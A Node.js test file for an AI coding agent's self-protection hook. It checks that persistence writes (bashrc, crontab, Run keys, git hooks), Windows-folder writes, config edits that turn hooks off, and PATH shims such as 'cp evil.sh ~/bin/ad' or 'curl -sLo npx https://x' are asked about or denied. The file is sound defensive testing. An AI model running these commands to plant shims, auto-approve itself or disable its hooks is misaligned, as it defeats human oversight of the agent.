// L7 P2b-2 (design D12 d, f, g): a host's config (Claude Code's settings, compared key by
// key after the edit applies; Codex's config), the Windows folder, and startup and
// persistence (rc and profile files, autostart, launch agents, git hooks, crontab, Run
// keys, shims in PATH folders).

import { test, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const TMP = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "ad-l7-host-")));
after(() => fs.rmSync(TMP, { recursive: true, force: true, maxRetries: 30, retryDelay: 100 }));
for (const k of ["AD_ROOT", "CLAUDE_CONFIG_DIR", "CODEX_HOME", "XDG_CONFIG_HOME"]) delete process.env[k];
const SP = await import("../src/hooks/self-protect.mjs");

const HOST_PLATFORM = process.platform === "win32" ? "win32" : "linux";
const sp = (command, { platform = "linux", tool = "Bash", cwd, home = "/home/dev", env = {} } = {}) => {
  const win = platform === "win32";
  const input = { tool_name: tool, tool_input: typeof command === "string" ? { command } : command, cwd: cwd ?? (win ? "C:\\work\\app" : "/work/app"), session_id: "s" };
  return SP.selfProtect(input, { host: "claude", platform, home: win && home === "/home/dev" ? "C:\\Users\\dev" : home, env, uid: 1000, realpath: (p) => fs.realpathSync.native(p) })?.decision ?? "allow";
};
const check = (cases, opts) => {
  const wrong = [];
  for (const [want, c] of cases) {
    const got = sp(c, opts);
    if (got !== want) wrong.push(`${want}: ${JSON.stringify(c).slice(0, 110)} → ${got}`);
  }
  assert.deepEqual(wrong, []);
};

test("startup and persistence ask; naming one of ad's verbs or a shim denies (D12g)", () => {
  check([
    ["ask", "echo 'export X=1' >> ~/.bashrc"],
    ["ask", "echo x >> ~/.zshrc"],
    ["ask", "cp p.fish ~/.config/fish/conf.d/p.fish"],
    ["ask", "echo x > ~/.config/autostart/a.desktop"],
    ["ask", "cp u.service ~/.config/systemd/user/u.service"],
    ["ask", "cp a.plist ~/Library/LaunchAgents/a.plist"],
    ["ask", "echo '.shell x' > ~/.sqliterc"],
    ["ask", "cp hook .git/hooks/pre-commit"],
    ["ask", "crontab jobs.txt"],
    ["ask", "git config core.hooksPath .githooks"],
    ["ask", "BASH_ENV=~/x.sh bash -c true"],
    ["deny", "echo 'ad review --accept-all' >> ~/.bashrc"],
    ["deny", "echo '* * * * * ad rules pause --all' | crontab -"],
    ["allow", "crontab -l"],
    ["allow", "cat ~/.bashrc"],
    ["allow", "echo x >> ~/notes/.bashrc"],
  ]);
  // A shim: a file named like ad, npx or node in a PATH folder.
  check([
    ["deny", "cp evil.sh ~/bin/ad"],
    ["deny", "echo x > /home/dev/bin/npx"],
    ["allow", "cp tool.sh ~/bin/mytool"],
  ], { env: { PATH: "/home/dev/bin:/usr/bin" } });
});

test("any write into the Windows folder is denied (D12f)", () => {
  check([
    ["deny", "Set-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value x"],
    ["deny", "echo x > %SystemRoot%\\System32\\x.dll"],
    ["deny", "Copy-Item x.dll $env:windir\\System32\\x.dll"],
    ["deny", "echo x > c:\\windows\\x.txt"],
    ["allow", "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts"],
    ["deny", "echo x > \\\\?\\C:\\Windows\\x.txt"],
  ], { platform: "win32", tool: "PowerShell" });
});

test("host config: shell writes ask; Claude Code's settings are compared key by key after the edit (D12d)", () => {
  check([
    ["ask", "echo {} > ~/.claude/settings.json"],
    ["ask", "echo {} > proj/.claude/settings.local.json"],
    ["ask", "sed -i 's/a/b/' ~/.claude.json"],
    ["ask", "echo x >> ~/.codex/config.toml"],
    ["ask", "cp h.json ~/.codex/hooks.json"],
  ]);
  const home = path.join(TMP, "home");
  const settings = path.join(home, ".claude", "settings.json");
  fs.mkdirSync(path.dirname(settings), { recursive: true });
  fs.writeFileSync(settings, JSON.stringify({ model: "x", hooks: { PreToolUse: [] }, env: { A: "1" } }, null, 2));
  // A real file in this host's temp folder: judged on this host's own paths (a Windows runner's
  // temp folder is a Windows path, which Linux rules can't place).
  const w = (input, tool = "Edit") => sp({ file_path: settings, ...input }, { tool, home, platform: HOST_PLATFORM });
  // An unrelated key: allowed.
  assert.equal(w({ old_string: '"model": "x"', new_string: '"model": "y"' }), "allow");
  // A protected key: asked.
  assert.equal(w({ old_string: '"A": "1"', new_string: '"A": "2"' }), "ask");
  assert.equal(w({ content: JSON.stringify({ model: "x", hooks: {}, env: { A: "1" } }) }, "Write"), "ask");
  // An edit that doesn't apply exactly once, or text that isn't JSON: asked.
  assert.equal(w({ old_string: "nowhere", new_string: "x" }), "ask");
  assert.equal(w({ content: "{not json" }, "Write"), "ask");
  // Turning every hook off, or naming ad's dispatcher: denied.
  assert.equal(w({ content: JSON.stringify({ model: "x", hooks: { PreToolUse: [] }, env: { A: "1" }, disableAllHooks: true }) }, "Write"), "deny");
  assert.equal(w({ old_string: '"model": "x"', new_string: '"model": "x", "statusLine": {"command": "node /x/bin/hook.mjs"}' }), "deny");
  // Codex's config: any write asks; .mcp.json naming ad's dispatcher: denied.
  assert.equal(sp({ file_path: path.join(home, ".codex", "config.toml"), content: "x" }, { tool: "Write", home, platform: HOST_PLATFORM }), "ask");
  assert.equal(sp({ file_path: path.join(TMP, "proj", ".mcp.json"), content: JSON.stringify({ mcpServers: { x: { command: "node", args: ["/a/memory/launch/run.mjs"] } } }) }, { tool: "Write", home, platform: HOST_PLATFORM }), "deny");
  assert.equal(sp({ file_path: path.join(TMP, "proj", ".mcp.json"), content: JSON.stringify({ mcpServers: { x: { command: "uvx", args: ["srv"] } } }) }, { tool: "Write", home, platform: HOST_PLATFORM }), "allow");
});

test("the fast path loads the check for host config, the Windows folder, startup files and shims", async () => {
  const TB = await import("../src/hooks/tool-before.mjs");
  const t = (tool, ti) => TB.selfProtectTriggered({ tool_name: tool, tool_input: ti });
  for (const c of ["echo x >> ~/.bashrc", "echo {} > ~/.claude/settings.json", "cp h.json ~/.codex/hooks.json", "echo x > C:\\Windows\\x.txt", "crontab jobs.txt", "git config core.hooksPath .githooks", "cp evil.sh ~/bin/ad", "cp hook .git/hooks/pre-commit", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y"]) assert.equal(t("Bash", { command: c }), true, c);
  assert.equal(t("Write", { file_path: "/home/u/.claude/settings.json" }), true);
  assert.equal(t("Edit", { file_path: "/home/u/proj/.mcp.json" }), true);
  for (const c of ["npm test", "git status", "ls -la src"]) assert.equal(t("Bash", { command: c }), false, c);
});

test("review round 1: copies into startup folders and PATH folders, $PROFILE and APPDATA, stripped triggers, project MCP servers, ENV values, CRLF settings", () => {
  check([
    ["ask", "cp x.desktop ~/.config/autostart/"],
    ["ask", "cp pre-commit .git/hooks/"],
    ["ask", "cp .bashrc ~/"],
    ["ask", "echo x >> ~/.bas''hrc"],
    ["ask", "systemctl --user enable --now /tmp/x.service"],
    ["ask", "launchctl load -w /tmp/x.plist"],
    ["ask", "env BASH_ENV=/tmp/x bash -c ls"],
    ["ask", "printf '[core]\\nhooksPath=/tmp/h\\n' >> ~/.gitconfig"],
    ["allow", "ENV=production npm run build"],
    ["allow", "echo '[Desktop Entry]' > packaging/myapp.desktop"],
  ]);
  check([
    ["deny", "cp npx ~/.local/bin/"],
    ["deny", "mv npx ~/.local/bin/"],
    ["deny", "cd ~/.local/bin && cp /tmp/evil node"],
    ["allow", "cp build/app ~/.local/bin/app"],
  ], { env: { PATH: "/home/dev/.local/bin:/usr/bin" } });
  check([
    ["ask", "Set-Content $PROFILE 'x'"],
    ["ask", "Add-Content C:\\Users\\dev\\OneDrive\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1 'x'"],
    ["ask", 'Copy-Item x.lnk "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'],
    ["deny", "Copy-Item evil.cmd $env:APPDATA\\npm\\npx.cmd"],
    ["deny", "Set-Content \\\\localhost\\C$\\Windows\\Temp\\x hi"],
    ["ask", "Register-ScheduledTask -TaskName x -Action $a"],
    ["ask", "schtasks -create -tn x -tr c:\\x.exe -sc onlogon"],
    ["ask", "New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name x -Value c:\\x.exe"],
  ], { platform: "win32", tool: "PowerShell" });
  // A file tool writing one of ad's verbs into a startup file: denied.
  assert.equal(sp({ file_path: "/home/dev/.bashrc", content: "alias x='ad review --approve-all'" }, { tool: "Write" }), "deny");
  // .claude.json: a project's own MCP servers count; CRLF and a BOM don't get in the way.
  const home = path.join(TMP, "home2");
  fs.mkdirSync(home, { recursive: true });
  const cj = path.join(home, ".claude.json");
  fs.writeFileSync(cj, "\uFEFF" + JSON.stringify({ projects: { "/work/app": { mcpServers: {} } }, theme: "a" }, null, 2).replace(/\n/g, "\r\n"));
  assert.equal(sp({ file_path: cj, content: JSON.stringify({ projects: { "/work/app": { mcpServers: { x: { command: "/tmp/evil" } } } }, theme: "a" }) }, { tool: "Write", home, platform: HOST_PLATFORM }), "ask");
  assert.equal(sp({ file_path: cj, old_string: '"theme": "a"', new_string: '"theme": "b"' }, { tool: "Edit", home, platform: HOST_PLATFORM }), "allow");
});

test("review round 2: Windows spellings, git settings that run programs, settings turning hooks off by shell, and a linear fast path", async () => {
  check([
    ["deny", "Set-Content C:\\Windows.\\Temp\\x hi"],
    ["deny", "Set-Content \\\\.\\C:\\Windows\\Temp\\x hi"],
    ["deny", "Set-Content $env:SystemDrive\\Windows\\Temp\\x hi"],
  ], { platform: "win32", tool: "PowerShell" });
  check([
    ["allow", "git config core.hooksPath"],
    ["allow", "git config --get core.hooksPath"],
    ["allow", "git config --get-all core.hooksPath x"], // (a value pattern: still a read)
    ["ask", "git config core.hooksPath .husky"],
    ["deny", "git config --global core.fsmonitor 'ad review --approve'"],
    ["ask", "git config --global include.path /tmp/g.cfg"],
    ["ask", "git config --global alias.st '!sh /tmp/x'"],
    ["allow", "git config --global alias.st status"],
    ["deny", `echo '{"disableAllHooks":true}' > ~/.claude/settings.json`],
    ["deny", `echo '{"mcpServers":{"x":{"command":"node","args":["/home/dev/.agent-daemon/bin/hook.mjs"]}}}' > .mcp.json`],
  ]);
  const TB = await import("../src/hooks/tool-before.mjs");
  const t = (command) => TB.selfProtectTriggered({ tool_name: "Bash", tool_input: { command } });
  for (const c of ["Set-Content C:\\Windows.\\Temp\\x hi", "systemctl enable --user /tmp/x.service", "rsync -a npx ~/.local/bin/", "cd ~/.local/bin && curl -sLo npx https://x"]) assert.equal(t(c), true, c);
  // The trigger stays linear on long copy/move text.
  for (const c of ["echo " + "cp ".repeat(21000), "mv a ".repeat(12000)]) {
    const t0 = Date.now();
    t(c);
    assert.ok(Date.now() - t0 < 500, `${Date.now() - t0} ms`);
  }
});
